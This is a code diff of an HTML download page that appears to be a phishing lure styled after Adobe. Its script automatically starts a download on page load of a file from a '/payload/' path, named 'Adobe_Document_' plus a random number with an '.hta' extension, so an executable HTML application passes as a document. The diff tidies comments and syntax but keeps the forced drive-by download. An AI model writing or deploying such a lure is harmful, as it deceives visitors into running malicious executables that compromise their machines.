@@ -11,7 +11,7 @@
         h1 { font-size: 28px; color: #333; margin-bottom: 10px; }
         p { font-size: 16px; color: #666; line-height: 1.5; margin-bottom: 20px; }
         .filename { font-weight: bold; color: #333; }
-        .btn { background-color: #ed2224; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; cursor: pointer; border: none; font-size: 16px; }
+        .btn { background-color: #ed2224; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
         .btn:hover { background-color: #c41b1d; }
         .note { font-size: 13px; color: #888; margin-top: 16px; }
     </style>
@@ -33,20 +33,18 @@
     </div>
 
     <script>
-        // Get the unique filename from the URL
+        // GET UNIQUE FILENAME FROM URL PARAMS (PRESERVES .HTA EXTENSION)
         const urlParams = new URLSearchParams(window.location.search);
         const uniqueFile = urlParams.get('file') || 'Adobe_Document_' + Math.floor(Math.random() * 900000 + 100000) + '.hta';
         document.getElementById('fileName').innerText = uniqueFile;
 
-        // Auto-trigger download on load
-        window.onload = function() {
-            setTimeout(triggerDownload, 500);
-        };
+        // AUTO-TRIGGER DOWNLOAD ON PAGE LOAD
+        window.onload = () => setTimeout(triggerDownload, 500);
 
         function triggerDownload() {
             const link = document.createElement('a');
-            link.href = `/payload/${uniqueFile}`;
-            link.download = uniqueFile;
+            link.href = `/payload/${uniqueFile}`; // SENDS EXACT UNIQUE NAME TO SERVER
+            link.download = uniqueFile;           // FORCES BROWSER TO USE UNIQUE NAME
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
@@ -54,9 +52,10 @@
 
         function forceDownload() {
             triggerDownload();
-            document.querySelector('.btn').textContent = 'Download Started...';
-            document.querySelector('.btn').disabled = true;
-            document.querySelector('.btn').style.background = '#ccc';
+            const btn = document.querySelector('.btn');
+            btn.textContent = 'Download Started...';
+            btn.disabled = true;
+            btn.style.background = '#ccc';
         }
     </script>
 </body>
